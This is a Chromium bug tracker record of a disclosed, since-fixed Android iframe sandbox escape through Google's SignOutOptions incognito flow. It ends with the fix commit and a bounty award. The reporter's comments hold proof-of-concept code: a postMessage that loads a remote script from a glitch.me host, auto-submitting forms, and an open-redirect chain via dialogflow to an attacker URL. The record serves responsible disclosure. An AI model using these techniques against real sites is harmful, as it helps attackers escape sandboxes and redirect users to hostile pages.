# Iframe sandbox allow-popups-to-escape-sandbox bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [40069622](https://issues.chromium.org/issues/40069622) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>IFrameSandbox |
| **Platforms** | Android |
| **Reporter** | nd...@protonmail.com |
| **Assignee** | bs...@google.com |
| **Created** | 2023-08-15 |
| **Bounty** | $3,000.00 |

## Description

**Steps to reproduce the problem:**  

Open index.html on an Android device and click you should get an alert() that escapes the iframe/csp sandbox

**Problem Description:**  

On Android SignOutOptions has a feature where it will open an incognito window to a custom URL this does not inherit the sandbox.

**Additional Comments:**

\*\*Chrome version: \*\* 113.0.0.0 \*\*Channel: \*\* Stable

**OS:** Android

## Attachments

- [escape.mp4](attachments/escape.mp4) (video/mp4, 799.7 KB)
- [index.html](attachments/index.html) (text/plain, 201 B)
- [redir.html](attachments/redir.html) (text/plain, 303 B)
- [sandboxed.html](attachments/sandboxed.html) (text/plain, 114 B)

## Timeline

### [Deleted User] (2023-08-15)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2023-08-15)

This looks to be fixed in Canary however the fix does look bypass able so I will continue.

### nd...@protonmail.com (2023-08-15)

Ref: https://chromium-review.googlesource.com/c/chromium/src/+/1855925

### nd...@protonmail.com (2023-08-16)

How to bypass the new origin check:
let f = document.createElement("iframe"); f.src = "https://www.gstatic.com/alkali/d78121f02d90dc923359a36d4b03dc5b4c2ae024.html"; document.body.appendChild(f); setTimeout(() => { f.contentWindow.postMessage({resourcePaths: {jsPath: "https://mud-attractive-save.glitch.me/code.js"}}, "*"); }, 2000);

code.js:

let w;

onclick = () => {
  w = open("");
  setTimeout(() => {
    w.document.write('<form action="https://accounts.google.com/SignOutOptions?continue=https://www.google.com/amp/a/s/example.com" method="post"><input type="submit" name="incognito" value="1" /></form>')
  }, 1000);
};

### nd...@protonmail.com (2023-08-16)

storage.googleapis.com is also there so maybe could have just put the payload in a google bucket but gstatic way more fun!

### an...@chromium.org (2023-08-16)

Assigning to owner (and CCing reviewers of) CL referenced in c#3. Can you take a look? Thanks! 
Setting Severity to High provisionally (renderer sandbox escape)

[Monorail components: Services>SignIn]

### [Deleted User] (2023-08-16)

[Empty comment from Monorail migration]

### ms...@chromium.org (2023-08-17)

I think is a duplicate of https://crbug.com/chromium/1005831, which was already fixed.

### nd...@protonmail.com (2023-08-17)

https://crbug.com/chromium/1473067#c4 has a bypass that still works in chrome canary

### nd...@protonmail.com (2023-08-17)

Was it https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/signin/chrome_signin_helper.cc;drc=e5e0962e49c3334114ffb58624b58abcf5014b4f;l=213 because that is True if |url| is hosted by Google.

Google hosts user generated content on gstatic.com, storage.googleapis.com, googleusercontent.com maybe other its also an issue if google should be allowed to escape the sandbox.

### ms...@chromium.org (2023-08-17)

Re-opening the bug https://crbug.com/chromium/1473067#c10.

### [Deleted User] (2023-08-18)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-08-18)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-08-30)

bsazonov: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-09-11)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ar...@google.com (2023-09-18)

[secondary security shepherd]
Hi Boris, gentle ping about this bug. What's the current status?

### [Deleted User] (2023-10-11)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-14)

We commit ourselves to a 60 day deadline for fixing for high severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ms...@chromium.org (2023-10-17)

[Empty comment from Monorail migration]

### xi...@chromium.org (2023-10-25)

(security secondary shepherd) Looping in other signin/ owners for input too.

[Monorail components: Blink>SecurityFeature>IFrameSandbox]

### ad...@google.com (2023-10-26)

(I am a bot: this is an auto-cc on a security bug)

### nd...@protonmail.com (2023-11-08)

PoC:
https://terjanq.me/xss.php?html=%3Ciframe%20sandbox=%22allow-scripts%20allow-forms%20allow-same-origin%20allow-popups%22%20src=%22https://storage.googleapis.com%22%3E

Given the limitation maybe Security_Severity-Medium

### am...@chromium.org (2023-11-15)

[security shepherd] Hi ndevtk, can you please upload the POC rather than linking to it? Thanks! 

I concur with you on the point of severity, thanks for making that point. I think there limitations to exploitation here and this doesn't align to renderer sbx in the standard framing of severity assessment, and is more aligned with issues like https://crbug.com/chromium/1365100. Downgrading to medium severity. 



### am...@chromium.org (2023-11-15)

[security shepherd con't] That being said, even with a reduction to medium-severity, we do need to make meaningful progress on open security issues. 
bsazonov@ can you please take a look at this. Even if you are not addressing it immediately, can this be passed to someone who has some time to work on it or be updated with a next-action date with an estimate date on when some work on this issue can begin. Thank you. 

### nd...@protonmail.com (2023-11-15)

Thanks providing the new code in this comment :)

Victim page:
<iframe sandbox="allow-scripts allow-forms allow-same-origin allow-popups" src="https://storage.googleapis.com/">

Attacker iframe:
<a target='_blank' href='exploit.html'>click here</a>

Attacker popup (That's hosted on storage.googleapis.com, opened from a sandboxed iframe without allow-popups-to-escape-sandbox):
 
<!doctype html>
<html>
<head>
<style>html { font-family: sans-serif; }</style>
</head>
<body>
<h1>Hello</h1>
<form action="https://accounts.google.com/SignOutOptions?continue=https://dialogflow.cloud.google.com/redirect?encoded_url=https://ndev.tk/evil" method="post">
<input id="submitBtn" type="submit" name="incognito" value="1" />
</form>
<script>
submitBtn.click();
</script>
</body>
</html>

https://dialogflow.cloud.google.com/redirect is used as an open redirect on *.google.com there maybe other options.

### [Deleted User] (2023-12-06)

[Empty comment from Monorail migration]

### vo...@google.com (2023-12-18)

[Empty comment from Monorail migration]

### bs...@chromium.org (2023-12-19)

I have a tentative fix in progress: https://crrev.com/c/5134969.

### nd...@protonmail.com (2023-12-19)

Does this check if the request was initiated over a secure connection?

### gi...@appspot.gserviceaccount.com (2023-12-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/b75faaa929e4ab77c74e7f1f919df5fa06c7c481

commit b75faaa929e4ab77c74e7f1f919df5fa06c7c481
Author: Boris Sazonov <bsazonov@chromium.org>
Date: Fri Dec 22 12:13:58 2023

Tighten up domain check for ProcessMirrorHeader

Prior to this CL, ProcessMirrorHeader was allowing any Google-associated
domains. This CL changes it so that only Google and YT domains are
accepted.

The check is gated by VerifyRequestInitiatorForMirrorHeaders flag and
can be easily disabled.

Bug: 1473067
Change-Id: I2d79d9b2e2d607f131234f36c85316a2144f6322
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5134969
Reviewed-by: Mihai Sardarescu <msarda@chromium.org>
Code-Coverage: findit-for-me@appspot.gserviceaccount.com <findit-for-me@appspot.gserviceaccount.com>
Commit-Queue: Boris Sazonov <bsazonov@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1240525}

[modify] https://crrev.com/b75faaa929e4ab77c74e7f1f919df5fa06c7c481/chrome/browser/signin/chrome_signin_helper.cc
[modify] https://crrev.com/b75faaa929e4ab77c74e7f1f919df5fa06c7c481/chrome/browser/signin/mirror_interactive_uitest.cc


### bs...@chromium.org (2023-12-27)

[Empty comment from Monorail migration]

### bs...@chromium.org (2023-12-27)

Now that the domain check is tightened, the flow described in this bug will no longer work, bumping down the priority.

In the meantime, the server team will look into adding XSRF protection to these flows.

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-10)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-11)

[Empty comment from Monorail migration]

### am...@chromium.org (2024-01-29)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2024-01-30)

https://crbug.com/chromium/1507651 shows an extra impact of a file picker spoof on Android.
Should have just been a comment... sorry about that.

Looking forward to the XSRF protection!

### is...@google.com (2024-01-30)

This issue was migrated from crbug.com/chromium/1473067?no_tracker_redirect=1

[Multiple monorail components: Blink>SecurityFeature>IFrameSandbox, Services>SignIn]
[Monorail mergedwith: crbug.com/chromium/1507651]
[Monorail mergedinto: crbug.com/chromium/1005831]
[Monorail components added to Component Tags custom field.]

### am...@chromium.org (2024-02-14)

reopening this issue as it appears it was incorrectly closed as a duplicate as an artifact of the issue tracker migration (reported and tracked as [b/325072672](https://issues.chromium.org/issues/325072672))

### bs...@chromium.org (2024-02-15)

XSRF protection was implemented for "Go Incognito" on Gaia, closing.

### am...@google.com (2024-02-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-02-22)

Congratulations NDevTK and Thomas (and Šmudla)! The Chrome VRP Panel has decided to award you a combined total of $3,000 for this report ($1,000) and [crbug.com/40948343](https://crbug.com/40948343) ($2,000). Thank you for your efforts -- including the video demonstration (with music! and pictures of Šmudla the cat!) -- and reporting this issue to us!

### nd...@protonmail.com (2024-02-23)

Thanks :)
Please give $1000 (half of crbug.com/40948343) to Thomas/Šmudla

We hope the cat gets a credit in the release notes. 🐈

### pe...@google.com (2024-05-24)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40069622)*
